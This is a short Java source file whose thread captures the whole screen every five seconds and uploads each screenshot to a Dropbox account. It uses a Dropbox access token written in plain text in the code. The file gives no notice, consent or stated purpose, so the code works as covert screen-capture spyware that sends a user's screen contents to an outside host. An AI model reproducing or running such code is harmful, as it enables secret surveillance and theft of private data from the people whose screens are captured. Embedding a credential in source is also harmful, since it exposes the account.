package company;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {


    @Override
    public void run() {
        while (true) {
            try {
                sleep(5000);
                Date dateNow = new Date();
                String formatter =  new SimpleDateFormat("yyyyMMdd_HHmmss").format(dateNow);

                String ACCESS_TOKEN = "61Caa7bhR2AAAAAAAAAAGm14WLofYXTKBmV_BLuW0G3vdBCfXIHn7XQ47oSQExSt";
                DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
                DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
                Robot robot = new Robot();
                BufferedImage image = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(image, "png", baos);
                InputStream is = new ByteArrayInputStream(baos.toByteArray());

                client.files().uploadBuilder("/"+formatter+".png").uploadAndFinish(is);

        } catch(InterruptedException | IOException | AWTException | DbxException e){
            e.printStackTrace();
        }
    }

}
}

